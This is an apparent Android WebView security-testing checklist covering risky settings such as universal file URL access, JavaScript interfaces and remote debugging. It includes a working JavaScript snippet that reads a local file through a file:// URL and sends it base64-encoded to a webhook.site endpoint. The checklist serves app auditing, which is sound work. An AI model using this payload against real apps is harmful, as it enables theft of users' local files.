# Web View

- [ ] **Check for `loadURL()` Function**
  - [ ] **Check for `WebView.getSettings().setJavaScriptEnabled(true)`**: This setting allows the execution of JavaScript code within the WebView.

  > **Note:** This setting alone isn't sufficient to pose a high security risk. Additional settings need to be checked, such as the following:

  - [ ] **Check for `WebView.setAllowUniversalAccessFromFileURLs(true)`**: This setting removes all same-origin policy restrictions and allows the WebView to make requests from file URLs to the web. This can potentially allow an attacker to read local files using JavaScript and send them to an attacker-controlled domain.

  - [ ] **Check for `WebView.addJavascriptInterface("OBJECT_OF_JAVA_CLASS", "OBJECT_OF_JAVASCRIPT_CLASS")`**: This setting creates an interface between JavaScript in the WebView and Java code defined in the interface. From the JavaScript object, public functions from the Java object class can be called.

## Example of JavaScript Code for Data Exfiltration

```javascript
<script>
var xhr = new XMLHttpRequest();
var xhr2 = new XMLHttpRequest();

xhr.onreadystatechange = () => {
    if (xhr.readyState === 4) {
        xhr2.open("POST", "https://webhook.site/your-endpoint");
        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr2.send('data=' + btoa(xhr.responseText));
    }
};

xhr.open("GET", "file:///path/to/file", true);
xhr.send();
</script>
```
- [ ] Check for Remote Debugging with WebView.setWebContentsDebuggingEnabled(true)
    - If enabled, anyone on the same local network can see , control the WebView and execute JavaScript code.

    - You can test WebView remote debugging using chrome://inspect/#devices in Google Chrome.